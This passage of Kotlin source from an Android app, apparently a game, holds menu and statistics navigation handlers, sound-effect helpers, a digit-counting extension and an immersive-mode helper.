    fun openMenu(view: View) {
        playClick()
        startActivity(Intent(this, MenuActivity::class.java))
    }


    fun viewStats(view: View) {
        playClick()
        startActivity(Intent(this, StatisticsActivity::class.java))
    }

    private fun playClick() {
        if (prefs[SOUND_ENABLED, true]) {
            GlobalScope.launch {
                click.start()
            }
        }
    }

    private fun playTap() {
        if (prefs[SOUND_ENABLED, true]) {
            GlobalScope.launch {
                tap.start()
            }
        }
    }

    private fun playWhoosh(playPopAfter: Boolean = false) {
        if (prefs[SOUND_ENABLED, true]) {
            GlobalScope.launch {
                whoosh.start()
            }.invokeOnCompletion { if (playPopAfter) playPop() }
        }
    }

    private fun playPop() {
        if (prefs[SOUND_ENABLED, true]) {
            GlobalScope.launch {
                pop.start()
            }
        }
    }
}


//returns the number of digits
fun Int.length(): Int {
    var copy = this
    var count = 0
    while (copy != 0) {
        copy /= 10
        count++
    }
    return count
}


fun AppCompatActivity.hideSystemUI() {
    // Enables regular immersive mode.
    window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_FULLSCREEN)
}